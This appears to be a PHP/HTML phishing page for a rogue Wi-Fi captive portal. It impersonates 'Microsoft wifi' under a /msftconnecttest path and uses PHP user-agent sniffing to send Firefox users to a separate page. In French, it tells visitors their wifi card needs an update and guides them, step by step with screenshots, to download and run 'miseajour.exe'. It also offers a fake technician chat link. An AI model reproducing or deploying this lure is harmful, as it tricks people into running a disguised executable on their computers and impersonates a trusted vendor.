<?php
if(strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE)
   echo 'Internet explorer';
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) //For Supporting IE 11
    echo 'Internet explorer';
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE)
   header('Location: /msftconnecttest/mozilla.php');
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE);
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== FALSE)
   echo "Opera Mini";
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE)
   echo "Opera";
 elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE)
   echo "Safari";
 else
   echo 'Something else';
   ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head>
  <title>Microsoft wifi</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <link rel="stylesheet" type="text/css" media="screen" href="/msftconnecttest/css/style.css" />
  </head>
  <body>
<center><img src="/msftconnecttest/img/microsoft.png" alt="aide"></a><center>
	<br />
	<br />	
	<br>
	<br>	
	<br>
	<br>
	<br>
<p>Votre carte wifi a besoin <b>d'une mise a jour</b> pour continuer a utiliser internet.</p>
			</p>
			<br />
			<br />
<p>Suivez les instructions suivantes:</p>

<p>T&eacute;l&eacute;chargez la mise a jour en cliquant sur le lien ci-dessous.</p>
<br />
<br />
<a href="miseajour.exe" download="">Mise a jour de la carte wifi</a>
<br />
<br />
<p>Une fois la mise a jour t&eacute;l&eacute;charg&eacute;e, cliquez dessus en bas a gauche de votre navigateur internet.</p>
<br />
<br />
<center><img src="/msftconnecttest/img/aide2.PNG" width="800" height="250" alt="aide"></a></center>
<br />
<br />
<p>Ensuite cliquez sur enregistrer puis cliquez une seconde fois sur la mise a jour afin être sûr que la mise a jour se lance. <p>
<br />
<br />
<center><img src="/msftconnecttest/img/windowsupdate.PNG" width="800" height="125" alt="aide"></a></center>
<br />
<br />
<p>Une fenêtre va s'ouvrir, cliquez sur <b>ex&eacute;cuter.</b><p>
<br />
<br />
<center><img src="/msftconnecttest/img/aide.PNG" width="600" height="550" alt="aide"></a></center>
<br />
<br />
<p>Ensuite attendez que la mise a jour s'effectue, n'&eacute;teignez pas votre ordinateur et ne vous déconnectez pas du réseau wifi.Le processus dure entre cinq et dix minutes.</p>
<p>Vous serez avertis par un message une fois la mise a jour effectu&eacute;e et vous pourrez de nouveau naviguer sur internet.</p>
<br>
<br>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/msftconnecttest/shout/microsofttchat.php" target="_blank"><u>aide en ligne</u> ...</a>
</br>
</br>
<br />
<br />
	</body>
</html>

